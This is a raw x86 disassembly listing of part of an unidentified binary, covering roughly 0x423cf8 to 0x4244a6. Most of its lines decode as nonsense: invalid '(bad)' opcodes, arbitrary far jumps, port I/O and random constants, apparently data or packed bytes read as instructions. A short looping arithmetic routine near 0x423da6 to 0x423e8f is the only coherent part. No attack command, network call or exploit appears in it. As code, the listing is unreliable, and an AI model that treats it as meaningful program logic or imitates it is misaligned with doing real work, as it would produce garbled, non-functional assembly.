  423cf8:	xor    DWORD PTR [ebp-0x703d8bb0],edi
  423cfe:	sub    bl,BYTE PTR [ebx-0x2b]
  423d01:	sbb    esi,DWORD PTR [eax-0x5f15a693]
  423d07:	fimul  DWORD PTR [ebx]
  423d09:	xor    al,BYTE PTR [eax+0x2c]
  423d0c:	cs dec eax
  423d0e:	and    al,0xec
  423d10:	outs   dx,DWORD PTR ds:[esi]
  423d11:	inc    ebp
  423d12:	push   ss
  423d13:	setns  BYTE PTR [eax-0xb]
  423d17:	sbb    DWORD PTR ds:0xc2c98096,edi
  423d1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d1e:	dec    edx
  423d1f:	push   ss
  423d20:	retf   
  423d21:	xchg   edi,eax
  423d22:	or     BYTE PTR [ecx-0x49e82572],al
  423d28:	test   DWORD PTR [ebx],esp
  423d2a:	ficom  WORD PTR [ecx+0x47]
  423d2d:	fwait
  423d2e:	jge    0x423d23
  423d30:	fnstcw WORD PTR [esi-0x45bf0347]
  423d36:	xchg   esp,eax
  423d37:	loopne 0x423db5
  423d39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d3a:	dec    esp
  423d3b:	iret   
  423d3c:	mov    cs,WORD PTR [eax]
  423d3e:	inc    edi
  423d3f:	lahf   
  423d40:	sub    DWORD PTR [ebp-0x54acf700],ecx
  423d46:	lahf   
  423d47:	fldenv [edx-0x4d]
  423d4a:	(bad)  [ebp-0x3377dc13]
  423d50:	sub    BYTE PTR [ebx-0x79664389],cl
  423d56:	mov    al,BYTE PTR [edx-0x6b872fe6]
  423d5c:	sub    ah,BYTE PTR [edx+ebx*2-0x29]
  423d60:	fcomp  QWORD PTR [ebx+0x6835e073]
  423d66:	cmc    
  423d67:	loope  0x423d52
  423d69:	add    DWORD PTR [edx-0x59],eax
  423d6c:	or     al,BYTE PTR [edx+0x4d]
  423d6f:	in     eax,dx
  423d70:	dec    esi
  423d71:	daa    
  423d72:	jle    0x423d77
  423d74:	xchg   esp,eax
  423d75:	clc    
  423d76:	cmp    dh,BYTE PTR [ebx]
  423d78:	aad    0x79
  423d7a:	xchg   edx,eax
  423d7b:	popa   
  423d7c:	test   DWORD PTR [esi+0x4057a93a],esi
  423d82:	int    0x83
  423d84:	mov    edx,0x95987ef8
  423d89:	mov    ah,0xb2
  423d8b:	div    DWORD PTR [ebx-0x51]
  423d8e:	add    esp,DWORD PTR [edi]
  423d90:	xlat   BYTE PTR ds:[ebx]
  423d91:	sahf   
  423d92:	daa    
  423d93:	ins    DWORD PTR es:[edi],dx
  423d94:	test   eax,0x97fe9ef0
  423d99:	arpl   WORD PTR [eax],dx
  423d9b:	mov    bh,0x58
  423d9d:	sbb    DWORD PTR [ecx],eax
  423d9f:	sub    al,0x62
  423da1:	mov    ebx,0xd3af0f10
  423da6:	mov    DWORD PTR [ebp-0x58],edx
  423da9:	mov    edx,DWORD PTR [ebp+0x8]
  423dac:	mov    ebx,DWORD PTR [ebp-0x54]
  423daf:	add    edx,0x64f8da
  423db5:	or     edx,ebx
  423db7:	mov    DWORD PTR [ebp-0x54],edx
  423dba:	mov    edx,DWORD PTR [ebp+0x8]
  423dbd:	mov    ebx,DWORD PTR [ebp-0x50]
  423dc0:	add    edx,ecx
  423dc2:	xor    edx,ebx
  423dc4:	mov    DWORD PTR [ebp-0x50],edx
  423dc7:	mov    edx,DWORD PTR [ebp+0x8]
  423dca:	mov    ebx,DWORD PTR [ebp-0x4c]
  423dcd:	add    edx,edi
  423dcf:	and    edx,ebx
  423dd1:	mov    DWORD PTR [ebp-0x4c],edx
  423dd4:	mov    edx,DWORD PTR [ebp+0x8]
  423dd7:	mov    ebx,DWORD PTR [ebp-0x48]
  423dda:	lea    edx,[ebx+edx*1+0x241fc1f]
  423de1:	mov    DWORD PTR [ebp-0x48],edx
  423de4:	mov    edx,DWORD PTR [ebp+0x8]
  423de7:	mov    ebx,0xfa5e15e2
  423dec:	sub    ebx,edx
  423dee:	add    ebx,DWORD PTR [ebp-0x44]
  423df1:	mov    DWORD PTR [ebp-0x44],ebx
  423df4:	mov    edx,DWORD PTR [ebp+0x8]
  423df7:	xor    edx,eax
  423df9:	add    edx,esi
  423dfb:	jne    0x4219fb
  423e01:	jmp    0x423e8f
  423e06:	mov    edx,DWORD PTR [ebp+0x8]
  423e09:	mov    ebx,DWORD PTR [ebp-0x8]
  423e0c:	xor    edx,eax
  423e0e:	xor    ebx,eax
  423e10:	sub    edx,ebx
  423e12:	sub    edx,esi
  423e14:	xor    edx,eax
  423e16:	mov    DWORD PTR [ebp+0x8],edx
  423e19:	mov    edx,DWORD PTR [ebp+0x8]
  423e1c:	mov    ebx,DWORD PTR [ebp-0x58]
  423e1f:	add    edx,0x5708f8
  423e25:	imul   edx,ebx
  423e28:	mov    DWORD PTR [ebp-0x58],edx
  423e2b:	mov    edx,DWORD PTR [ebp+0x8]
  423e2e:	mov    ebx,DWORD PTR [ebp-0x54]
  423e31:	add    edx,0x64f8da
  423e37:	or     edx,ebx
  423e39:	mov    DWORD PTR [ebp-0x54],edx
  423e3c:	mov    edx,DWORD PTR [ebp+0x8]
  423e3f:	mov    ebx,DWORD PTR [ebp-0x50]
  423e42:	add    edx,ecx
  423e44:	xor    edx,ebx
  423e46:	mov    DWORD PTR [ebp-0x50],edx
  423e49:	mov    edx,DWORD PTR [ebp+0x8]
  423e4c:	mov    ebx,DWORD PTR [ebp-0x4c]
  423e4f:	add    edx,edi
  423e51:	and    edx,ebx
  423e53:	mov    DWORD PTR [ebp-0x4c],edx
  423e56:	mov    edx,DWORD PTR [ebp+0x8]
  423e59:	mov    ebx,DWORD PTR [ebp-0x48]
  423e5c:	lea    edx,[ebx+edx*1+0x241fc1f]
  423e63:	mov    DWORD PTR [ebp-0x48],edx
  423e66:	mov    edx,DWORD PTR [ebp+0x8]
  423e69:	mov    ebx,0xfa5e15e2
  423e6e:	sub    ebx,edx
  423e70:	add    ebx,DWORD PTR [ebp-0x44]
  423e73:	mov    DWORD PTR [ebp-0x44],ebx
  423e76:	mov    edx,DWORD PTR [ebp+0x8]
  423e79:	xor    edx,eax
  423e7b:	add    edx,esi
  423e7d:	jne    0x423e06
  423e83:	mov    ecx,DWORD PTR [ebp-0x8]
  423e86:	xor    ecx,eax
  423e88:	mov    eax,DWORD PTR [ebp+0x10]
  423e8b:	add    ecx,esi
  423e8d:	mov    DWORD PTR [eax],ecx
  423e8f:	pop    edi
  423e90:	jmp    0x424adf
  423e95:	imul   ecx,DWORD PTR [ebx-0x448b1756],0x58d8b2f
  423e9f:	scas   eax,DWORD PTR es:[edi]
  423ea0:	repnz call 0x798b:0xb9ad85c8
  423ea8:	jp     0x423ef2
  423eaa:	data16 jp 0x423f27
  423ead:	jmp    0xc2bc:0x6255e77
  423eb4:	shr    ch,cl
  423eb6:	out    dx,al
  423eb7:	mov    WORD PTR [eax-0x2f7ab95d],gs
  423ebd:	fstp   QWORD PTR [edi+0x6cb10052]
  423ec3:	jmp    0xa6867474
  423ec8:	jp     0x423ecf
  423eca:	mov    edx,edx
  423ecc:	xchg   ecx,eax
  423ecd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ece:	js     0x423e91
  423ed0:	scas   al,BYTE PTR es:[edi]
  423ed1:	pusha  
  423ed2:	mov    eax,ds:0xd2d9077b
  423ed7:	push   0xfc9c9ca4
  423edc:	push   edi
  423edd:	scas   al,BYTE PTR es:[edi]
  423ede:	push   0xffffff8a
  423ee0:	cmp    BYTE PTR [edx],cl
  423ee2:	lods   eax,DWORD PTR ds:[esi]
  423ee3:	ins    DWORD PTR es:[edi],dx
  423ee4:	mov    al,ds:0xf06b129e
  423ee9:	test   al,0x8
  423eeb:	sub    esi,DWORD PTR [eax+ebp*2+0x27f8b6a5]
  423ef2:	and    edi,DWORD PTR [edx-0x4e4cb11e]
  423ef8:	jns    0x423eac
  423efa:	xlat   BYTE PTR ds:[ebx]
  423efb:	dec    edi
  423efc:	dec    esp
  423efd:	push   ds
  423efe:	icebp  
  423eff:	scas   eax,DWORD PTR es:[edi]
  423f00:	fs loope 0x423ed0
  423f03:	aad    0x2f
  423f05:	push   edi
  423f06:	das    
  423f07:	dec    esi
  423f08:	jns    0x423e9d
  423f0a:	sbb    esp,DWORD PTR [esi+ecx*2]
  423f0d:	sar    DWORD PTR [esi-0x64],0x72
  423f11:	mov    ah,0x3b
  423f13:	aas    
  423f14:	xchg   ebp,eax
  423f15:	xchg   BYTE PTR [ecx-0x69f4c94e],bl
  423f1b:	xchg   ebp,eax
  423f1c:	ret    0x456
  423f1f:	dec    eax
  423f20:	xor    DWORD PTR [ebx+0xcfe3580],ebp
  423f26:	push   esp
  423f27:	jae    0x423f8c
  423f29:	outs   dx,BYTE PTR ds:[esi]
  423f2a:	mov    bh,0x27
  423f2c:	test   al,0xe8
  423f2e:	shl    ecx,0x3e
  423f31:	in     al,0x13
  423f33:	mov    ds:0x402db707,eax
  423f38:	shl    BYTE PTR [edi+0x78],0x34
  423f3c:	push   cs
  423f3d:	stos   DWORD PTR es:[edi],eax
  423f3e:	and    al,0x4
  423f40:	dec    ebx
  423f41:	cmp    ah,dh
  423f43:	out    dx,eax
  423f44:	test   al,0xf1
  423f46:	fcom   QWORD PTR ds:0x6ac66470
  423f4c:	leave  
  423f4d:	or     BYTE PTR [ebx],0xb1
  423f50:	cmp    dl,BYTE PTR fs:[esi-0x7a47648f]
  423f57:	mov    ?,edi
  423f59:	repnz push ds
  423f5b:	xor    al,0xd8
  423f5d:	out    dx,al
  423f5e:	dec    ebp
  423f5f:	(bad)  
  423f60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f61:	and    DWORD PTR [edi+0x13d3c832],eax
  423f67:	pop    es
  423f68:	leave  
  423f69:	dec    edi
  423f6a:	cmp    ch,BYTE PTR [ebp-0x5c]
  423f6d:	jbe    0x423fb9
  423f6f:	(bad)  
  423f70:	out    dx,al
  423f71:	stc    
  423f72:	into   
  423f73:	fidiv  DWORD PTR [ecx+0x1e6d630c]
  423f79:	cmp    BYTE PTR [ecx-0x78],bl
  423f7c:	(bad)  
  423f7d:	repz fs lahf 
  423f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f81:	xor    BYTE PTR [ecx+0x77780ff3],cl
  423f87:	out    0x67,al
  423f89:	jecxz  0x423fed
  423f8b:	mov    ebx,0x14325272
  423f90:	cdq    
  423f91:	push   es
  423f92:	sub    BYTE PTR [esi+ebx*4-0x7888a6ef],0x8e
  423f9a:	xchg   dl,al
  423f9c:	iret   
  423f9d:	(bad)  
  423f9e:	es jno 0x423fd6
  423fa1:	lods   eax,DWORD PTR ds:[esi]
  423fa2:	pop    edi
  423fa3:	push   0x5f
  423fa5:	xor    BYTE PTR [ebx+edx*2-0x43],0xa0
  423faa:	repnz add al,0x70
  423fad:	arpl   cx,bp
  423faf:	add    al,0x59
  423fb1:	and    BYTE PTR [ebx+0x7c],dl
  423fb4:	mov    ebx,0xb77e337a
  423fb9:	fsubr  QWORD PTR [edx+0xe891baa]
  423fbf:	inc    edi
  423fc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423fc1:	aas    
  423fc2:	lea    edi,[esp+esi*4]
  423fc5:	dec    ecx
  423fc6:	loopne 0x424038
  423fc8:	mov    ds:0x8d1d5d0f,al
  423fcd:	in     al,0x49
  423fcf:	cdq    
  423fd0:	repnz or ah,BYTE PTR [ecx]
  423fd3:	dec    ebx
  423fd4:	adc    bl,al
  423fd6:	xor    DWORD PTR [esi],eax
  423fd8:	push   edi
  423fd9:	nop
  423fda:	repz aas 
  423fdc:	mov    DWORD PTR [ebx],edi
  423fde:	pop    eax
  423fdf:	and    DWORD PTR [edx-0x66],ebx
  423fe2:	in     al,dx
  423fe3:	stc    
  423fe4:	ins    BYTE PTR es:[edi],dx
  423fe5:	dec    edi
  423fe6:	scas   al,BYTE PTR es:[edi]
  423fe7:	push   eax
  423fe8:	jmp    0x423f7d
  423fea:	ins    DWORD PTR es:[edi],dx
  423feb:	inc    esi
  423fec:	stos   DWORD PTR es:[edi],eax
  423fed:	inc    ebp
  423fee:	pop    ecx
  423fef:	imul   eax,DWORD PTR [esi+0x1d],0x81a4e697
  423ff6:	adc    BYTE PTR [edx],dl
  423ff8:	or     eax,0x3f0080a8
  423ffd:	inc    ecx
  423ffe:	pop    ds
  423fff:	enter  0x115c,0xb5
  424003:	dec    esi
  424004:	scas   eax,DWORD PTR es:[edi]
  424005:	ret    
  424006:	test   DWORD PTR [ebp+0x7c],ebp
  424009:	jmp    0x423feb
  42400b:	push   ss
  42400c:	and    al,0x98
  42400e:	repnz leave 
  424010:	xchg   ecx,eax
  424011:	ins    DWORD PTR es:[edi],dx
  424012:	adc    eax,0xf97d5fa5
  424017:	adc    ecx,DWORD PTR [esi]
  424019:	xchg   BYTE PTR [eax+0x238a91f3],ah
  42401f:	sbb    eax,0xf44fdbc9
  424024:	shr    BYTE PTR [ebp+0x7e593e],0x4a
  42402b:	inc    edi
  42402c:	call   0xa0000ee1
  424031:	or     esi,DWORD PTR [edi+eax*2]
  424034:	add    DWORD PTR [eax+0x60aae462],ebx
  42403a:	cmc    
  42403b:	and    DWORD PTR [edi+0x49],eax
  42403e:	pop    es
  42403f:	and    ecx,edx
  424041:	pop    ebx
  424042:	jae    0x424063
  424044:	pop    ss
  424045:	stos   BYTE PTR es:[edi],al
  424046:	imul   edi,ebp,0x63
  424049:	cmp    edx,DWORD PTR [ecx]
  42404b:	retf   
  42404c:	inc    edi
  42404d:	pusha  
  42404e:	mov    esi,0xd57c8f3c
  424053:	mov    DWORD PTR [ebp+0x1c],edx
  424056:	leave  
  424057:	push   0xffffffeb
  424059:	lea    ebp,ds:0xfe3e9800
  42405f:	arpl   WORD PTR [ebp+ebx*1-0x2a],bx
  424063:	mov    ebp,0xd5f82778
  424068:	nop
  424069:	inc    ebp
  42406a:	sbb    DWORD PTR [eax],esp
  42406c:	mov    DWORD PTR [ebp+0x5a5cb85b],esp
  424072:	cmp    BYTE PTR [ebp+0x720fd10f],dl
  424078:	add    cl,BYTE PTR [edx+0xb]
  42407b:	daa    
  42407c:	pop    eax
  42407d:	and    al,ch
  42407f:	icebp  
  424080:	dec    eax
  424081:	or     DWORD PTR [ebx-0x40],esp
  424084:	push   ss
  424085:	aaa    
  424086:	push   ss
  424087:	cmp    eax,0xc49b64f
  42408c:	xchg   BYTE PTR [esi+0x33ab7eee],bl
  424092:	add    eax,0xd9b55b0f
  424097:	clc    
  424098:	dec    ebx
  424099:	in     al,dx
  42409a:	ss push 0xd0f1ded0
  4240a0:	pop    ds
  4240a1:	sbb    eax,0xb20d6f0
  4240a6:	loop   0x4240c9
  4240a8:	mov    esi,0x7e23162c
  4240ad:	sbb    al,0x72
  4240af:	dec    ebp
  4240b0:	sbb    ebx,DWORD PTR [eax+0x7bfd7dba]
  4240b6:	hlt    
  4240b7:	jg     0x42406e
  4240b9:	jbe    0x42411a
  4240bb:	in     al,0xf9
  4240bd:	inc    ebx
  4240be:	jl     0x4240df
  4240c0:	or     BYTE PTR [ecx],cl
  4240c2:	add    al,BYTE PTR [esi+esi*1-0x15a6b18d]
  4240c9:	inc    eax
  4240ca:	es js  0x4240fb
  4240cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240ce:	stos   BYTE PTR es:[edi],al
  4240cf:	rol    ah,cl
  4240d1:	jmp    0x7247:0x21981848
  4240d8:	xchg   edi,eax
  4240d9:	xor    ebp,DWORD PTR [ecx]
  4240db:	or     eax,0x5b3f517f
  4240e0:	pop    ebp
  4240e1:	fs (bad) 
  4240e3:	inc    edx
  4240e4:	int    0x5a
  4240e6:	cdq    
  4240e7:	into   
  4240e8:	mov    ebx,0x8c6030d3
  4240ed:	pop    ecx
  4240ee:	arpl   WORD PTR [ebx],bx
  4240f0:	mov    WORD PTR [ebp-0x3e2f53b4],gs
  4240f6:	repnz out dx,al
  4240f8:	and    al,0x44
  4240fa:	adc    esi,DWORD PTR [edi-0x6c]
  4240fd:	lea    ebx,[ebp-0xf]
  424100:	loop   0x424129
  424102:	ins    BYTE PTR es:[di],dx
  424104:	jmp    0x42410e
  424106:	add    DWORD PTR [ecx+0x67b18b3e],0x61
  42410d:	scas   eax,DWORD PTR es:[edi]
  42410e:	push   esp
  42410f:	and    al,0x81
  424111:	ja     0x4240ca
  424113:	ds stos BYTE PTR es:[edi],al
  424115:	xchg   edi,eax
  424116:	xor    BYTE PTR [edi-0x33a24d38],ah
  42411c:	repz in al,dx
  42411e:	dec    edi
  42411f:	xchg   ecx,eax
  424120:	in     eax,dx
  424121:	loope  0x42416a
  424123:	inc    esi
  424124:	int3   
  424125:	or     ah,BYTE PTR [edi]
  424127:	test   eax,0x1f1600ee
  42412c:	mov    al,ds:0x4a388fcd
  424131:	sbb    esi,DWORD PTR [eax-0x2495e994]
  424137:	mov    dl,al
  424139:	add    al,0x66
  42413b:	iret   
  42413c:	fnstenv [ecx+0x33]
  42413f:	lahf   
  424140:	addr16 xchg ebp,eax
  424142:	mov    ebx,0xe802a2bf
  424147:	retf   0xed9f
  42414a:	jmp    0x5b79:0x685cc187
  424151:	jbe    0x4240f5
  424153:	scas   eax,DWORD PTR es:[edi]
  424154:	pop    edx
  424155:	bound  edx,QWORD PTR [esi+eiz*4]
  424158:	jae    0x42411a
  42415a:	pop    edi
  42415b:	das    
  42415c:	xor    BYTE PTR ds:0x870b9d0e,bh
  424162:	xchg   ebx,eax
  424163:	jae    0x424147
  424165:	test   DWORD PTR [ebp+0x66dda55c],esp
  42416b:	dec    ebx
  42416c:	adc    BYTE PTR [eax+0x10a36b08],cl
  424172:	cmp    dh,BYTE PTR [esi+0x2b089dd8]
  424178:	mov    DWORD PTR [ecx-0x12],edi
  42417b:	sub    eax,0x965ba69
  424180:	jl     0x42419d
  424182:	push   eax
  424183:	(bad)  
  424184:	push   edi
  424185:	push   ebx
  424186:	sub    edi,esi
  424188:	das    
  424189:	jl     0x42410d
  42418b:	outs   dx,DWORD PTR ds:[esi]
  42418c:	lods   al,BYTE PTR ds:[esi]
  42418d:	mov    cl,0x3e
  42418f:	ins    BYTE PTR es:[edi],dx
  424190:	inc    esi
  424191:	lahf   
  424192:	outs   dx,DWORD PTR ds:[esi]
  424193:	xchg   BYTE PTR [ebp-0x3aa52b42],bh
  424199:	xchg   DWORD PTR [esp+ebx*1+0x72],ecx
  42419d:	sbb    BYTE PTR [edi+0x30],ah
  4241a0:	outs   dx,BYTE PTR ds:[esi]
  4241a1:	dec    eax
  4241a2:	mov    bh,0x3e
  4241a4:	jae    0x4241af
  4241a6:	mov    al,0x95
  4241a8:	(bad)  
  4241a9:	and    DWORD PTR [esi+ebp*2-0x31e5d14d],ecx
  4241b0:	adc    al,0x66
  4241b2:	fadd   QWORD PTR [ecx+0x5f]
  4241b5:	daa    
  4241b6:	push   es
  4241b7:	lahf   
  4241b8:	push   ebp
  4241b9:	mov    eax,DWORD PTR [ecx+0xc996359]
  4241bf:	jp     0x424185
  4241c1:	cmp    bl,BYTE PTR [eax]
  4241c3:	in     eax,dx
  4241c4:	sub    ch,dh
  4241c6:	ret    
  4241c7:	lahf   
  4241c8:	cs (bad) 
  4241cb:	mov    ch,0xe5
  4241cd:	push   es
  4241ce:	push   edx
  4241cf:	xchg   ebp,eax
  4241d0:	and    DWORD PTR [edi+0x7a512cc3],esp
  4241d6:	jb     0x424202
  4241d8:	mov    cs,esp
  4241da:	mov    esp,0xd5d46032
  4241df:	sub    BYTE PTR [esi+0x8e1eb4a],dh
  4241e5:	retf   
  4241e6:	mov    ch,0xd3
  4241e8:	inc    ebp
  4241e9:	loope  0x424266
  4241eb:	mov    al,ds:0x92bdfd01
  4241f0:	in     al,dx
  4241f1:	(bad)  
  4241f2:	pop    esp
  4241f3:	sbb    eax,0xffb9b40c
  4241f8:	out    dx,al
  4241f9:	pop    esi
  4241fa:	inc    esi
  4241fb:	lahf   
  4241fc:	ja     0x4241c7
  4241fe:	outs   dx,DWORD PTR ds:[esi]
  4241ff:	adc    ebp,esp
  424201:	mov    dh,0x3
  424203:	pop    ebp
  424204:	int    0x8f
  424206:	pop    edx
  424207:	(bad)  
  424208:	jne    0x424239
  42420a:	shr    BYTE PTR [ebx-0x1d],0xcf
  42420e:	jl     0x4241d1
  424210:	ror    BYTE PTR [eax-0x71],cl
  424213:	out    0x31,al
  424215:	outs   dx,DWORD PTR ds:[esi]
  424216:	retf   0x5f42
  424219:	cmp    BYTE PTR [ebx+ecx*1+0x5a],ch
  42421d:	mov    edi,0x27ffda86
  424222:	(bad)  
  424223:	mov    eax,0x1f122d74
  424228:	push   0x6a163349
  42422d:	leave  
  42422e:	mov    dl,0xfb
  424230:	jbe    0x42427b
  424232:	js     0x4241c0
  424234:	aad    0xf8
  424236:	or     bh,BYTE PTR [ebx+eiz*8-0x4415ca19]
  42423d:	enter  0x6b8a,0xf1
  424241:	ins    BYTE PTR es:[edi],dx
  424242:	cmp    dh,BYTE PTR [ecx]
  424244:	gs ret 
  424246:	pop    edi
  424247:	xchg   BYTE PTR [edx+0x64d7a25a],bh
  42424d:	sub    BYTE PTR [ebx],0x5
  424250:	push   cs
  424251:	callw  0xcb9d
  424255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424256:	push   0x75bfae98
  42425b:	jmp    0xcacb:0xcbdab38
  424262:	(bad)  
  424263:	not    BYTE PTR [edx+0xb]
  424266:	sbb    al,0xf1
  424268:	cmp    dh,BYTE PTR [edi]
  42426a:	jb     0x424221
  42426c:	jnp    0x4241ff
  42426e:	imul   ebp,DWORD PTR [edi-0x48],0x709ffff7
  424275:	add    dl,BYTE PTR [ebx+0x3e]
  424278:	push   cs
  424279:	xlat   BYTE PTR ds:[ebx]
  42427a:	es sub al,0x3d
  42427d:	fdiv   QWORD PTR [edi]
  42427f:	or     al,dl
  424281:	mov    ds:0x249b19b9,eax
  424286:	pop    ecx
  424287:	jo     0x424235
  424289:	out    0xbf,al
  42428b:	lahf   
  42428c:	idiv   BYTE PTR [ebx]
  42428e:	cmp    eax,0xe51a8749
  424293:	mov    esp,DWORD PTR [esp+eax*8-0x3]
  424297:	add    al,al
  424299:	jl     0x4242d2
  42429b:	pop    DWORD PTR [eax]
  42429d:	jge    0x42426b
  42429f:	clc    
  4242a0:	jns    0x4242fa
  4242a2:	mov    DWORD PTR [eax+0x15],ebp
  4242a5:	test   al,0xd
  4242a7:	cli    
  4242a8:	enter  0x884d,0x94
  4242ac:	mov    eax,ds:0x2b69f2b6
  4242b1:	data16 mov ch,0x40
  4242b4:	dec    ebp
  4242b5:	jne    0x4242d0
  4242b7:	jl     0x424283
  4242b9:	ja     0x424272
  4242bb:	jmp    0x424339
  4242bd:	ds xchg esp,eax
  4242bf:	cli    
  4242c0:	inc    esp
  4242c1:	adc    eax,0x9aab3b2f
  4242c6:	pop    edx
  4242c7:	inc    esp
  4242c8:	gs (bad) 
  4242ca:	push   0x6b1fd690
  4242cf:	jl     0x424341
  4242d1:	xor    ch,BYTE PTR [edx]
  4242d3:	push   ebx
  4242d4:	dec    edx
  4242d5:	xor    eax,0x79ea8e0f
  4242da:	(bad)  
  4242db:	icebp  
  4242dc:	push   ebp
  4242dd:	(bad)  
  4242de:	push   esp
  4242df:	fdivr  QWORD PTR [ebx]
  4242e1:	mov    eax,0x2f701dfe
  4242e6:	jno    0x424363
  4242e8:	test   al,0x4a
  4242ea:	jle    0x42434a
  4242ec:	push   ecx
  4242ed:	and    edi,DWORD PTR [edi-0x208e0123]
  4242f3:	loop   0x4242f5
  4242f5:	in     al,dx
  4242f6:	push   0x657ac52e
  4242fb:	add    BYTE PTR ds:[ebx+ebx*1],ah
  4242ff:	push   cs
  424300:	imul   eax,ebp,0x9bc8dec1
  424306:	enter  0xe6f4,0x67
  42430a:	push   ebp
  42430b:	mov    ah,0xc2
  42430d:	inc    edx
  42430e:	jns    0x42438e
  424310:	xchg   edx,eax
  424311:	xchg   ecx,eax
  424312:	xor    DWORD PTR [ebp-0x5d],esp
  424315:	scas   eax,DWORD PTR es:[edi]
  424316:	enter  0xd575,0xa
  42431a:	dec    edi
  42431b:	push   edi
  42431c:	cmp    al,0xa0
  42431e:	inc    ebp
  42431f:	jb     0x42439e
  424321:	inc    esp
  424322:	out    dx,al
  424323:	push   0xffffff99
  424325:	pop    edi
  424326:	push   eax
  424327:	add    dh,BYTE PTR es:[edx]
  42432a:	popa   
  42432b:	test   DWORD PTR [ecx+0x71],eax
  42432e:	dec    edx
  42432f:	inc    esi
  424330:	jg     0x424340
  424332:	icebp  
  424333:	mov    WORD PTR [edi+edi*1-0x3f088400],?
  42433a:	pushf  
  42433b:	push   eax
  42433c:	popf   
  42433d:	into   
  42433e:	int    0x93
  424340:	dec    eax
  424341:	adc    eax,0x509beea8
  424346:	add    bl,BYTE PTR [ebp-0xbe707ab]
  42434c:	push   eax
  42434d:	mov    esp,0xe500acc7
  424352:	stos   DWORD PTR es:[edi],eax
  424353:	mov    ah,0x11
  424355:	mov    ah,0xa
  424357:	cs pop ebx
  424359:	sub    al,0x80
  42435b:	retf   
  42435c:	and    DWORD PTR [eax-0x2120b9a3],ecx
  424362:	stos   DWORD PTR es:[edi],eax
  424363:	adc    ebp,ebx
  424365:	dec    esi
  424366:	mov    WORD PTR [edi],fs
  424368:	adc    DWORD PTR [ebx+ebp*4-0x43],esp
  42436c:	out    dx,eax
  42436d:	fwait
  42436e:	jmp    0x6af133f0
  424373:	inc    edx
  424374:	jnp    0x424327
  424376:	mov    edx,DWORD PTR [edx]
  424378:	fs adc eax,0xbb631bc0
  42437e:	xchg   esp,esp
  424380:	pop    esp
  424381:	mov    eax,0x37dfcce4
  424386:	and    al,0x20
  424388:	cmp    DWORD PTR [ebx+0x23],eax
  42438b:	or     eax,0xefe9958a
  424390:	test   DWORD PTR [eax-0x34896d7d],edi
  424396:	popa   
  424397:	loopne 0x4243ae
  424399:	mov    dh,0x64
  42439b:	in     al,dx
  42439c:	xor    dl,BYTE PTR [esi+0x21addb05]
  4243a2:	cwde   
  4243a3:	enter  0x8474,0xc1
  4243a7:	shr    DWORD PTR [ebp-0x5c],1
  4243aa:	fcomp  st(3)
  4243ac:	or     eax,eax
  4243ae:	cwde   
  4243af:	in     eax,dx
  4243b0:	xchg   esp,eax
  4243b1:	push   ecx
  4243b2:	enter  0x862d,0x3d
  4243b6:	gs cmp edi,DWORD PTR es:[ecx+ebx*1]
  4243bb:	dec    ebp
  4243bc:	fadd   st(7),st
  4243be:	ds call 0x742cedec
  4243c4:	gs cmp bl,bh
  4243c7:	popa   
  4243c8:	xchg   ebx,eax
  4243c9:	cmp    eax,0xf23ef41d
  4243cf:	(bad)  
  4243d0:	sub    ch,BYTE PTR [eax]
  4243d2:	retf   0xc24d
  4243d5:	add    esi,DWORD PTR [esi]
  4243d7:	mov    ebx,0x5aa778b4
  4243dc:	inc    ebp
  4243dd:	xor    al,dl
  4243df:	adc    ecx,ecx
  4243e1:	jecxz  0x42436a
  4243e3:	shl    cl,cl
  4243e5:	xor    ebp,DWORD PTR [ebx]
  4243e7:	pushf  
  4243e8:	adc    ebp,edx
  4243ea:	popa   
  4243eb:	call   0x84b56723
  4243f0:	aaa    
  4243f1:	jb     0x4243be
  4243f3:	out    dx,eax
  4243f4:	inc    esi
  4243f5:	sahf   
  4243f6:	int3   
  4243f7:	cmc    
  4243f8:	pop    es
  4243f9:	or     esi,ecx
  4243fb:	sar    eax,1
  4243fd:	xor    ecx,esi
  4243ff:	aam    0xb3
  424401:	fnstsw WORD PTR [ebx+esi*4+0x66]
  424405:	jns    0x4243fd
  424407:	sar    BYTE PTR fs:[ebp-0x5a68fbf5],1
  42440e:	push   0x299d3963
  424413:	jne    0x424484
  424415:	inc    ecx
  424416:	dec    esp
  424417:	rol    DWORD PTR [ebx-0x53],1
  42441a:	cmpxchg BYTE PTR [ebp-0x322b2506],ch
  424421:	inc    edi
  424422:	das    
  424423:	retf   0x6923
  424426:	adc    esp,DWORD PTR [esi-0x71f4575a]
  42442c:	mov    ebp,0x863efda1
  424431:	inc    ax
  424433:	retf   0x56de
  424436:	pop    ss
  424437:	aas    
  424438:	enter  0x147f,0x1c
  42443c:	dec    eax
  42443d:	sbb    dh,ch
  42443f:	or     ah,BYTE PTR [ecx]
  424441:	and    BYTE PTR [ebx-0x65ede1a2],bh
  424447:	cmp    bh,dh
  424449:	jae    0x42443b
  42444b:	and    DWORD PTR [bp+di+0x0],esp
  42444f:	icebp  
  424450:	cs test eax,0x319b2dc6
  424456:	push   cs
  424457:	dec    edx
  424458:	test   eax,0xcfacef9
  42445d:	clc    
  42445e:	cmp    dl,BYTE PTR [eax+0x48fc570f]
  424464:	outs   dx,BYTE PTR ds:[esi]
  424465:	fbld   TBYTE PTR [ebx-0x20]
  424468:	xchg   ecx,eax
  424469:	add    edi,DWORD PTR [ebx]
  42446b:	stos   DWORD PTR es:[edi],eax
  42446c:	cwde   
  42446d:	ret    
  42446e:	rcl    ah,cl
  424470:	sub    DWORD PTR [ecx-0x1e828bb5],ecx
  424476:	mov    ds:0x213ade58,al
  42447b:	mov    esp,DWORD PTR [ebp-0x36e74d04]
  424481:	(bad)  
  424482:	mov    al,0xb6
  424484:	cmp    BYTE PTR [ebp+0xc],ah
  424487:	cmp    eax,0xa56c81b
  42448c:	mov    eax,ds:0xa8886c0c
  424491:	push   0x9156b937
  424496:	xchg   ebp,eax
  424497:	loop   0x4244fd
  424499:	inc    ebp
  42449a:	or     DWORD PTR [ebx+0x44c15e0a],ebx
  4244a0:	fiadd  WORD PTR [eax+0x1f]
  4244a3:	jne    0x42444c
  4244a5:	pop    ebx
  4244a6:	push   es
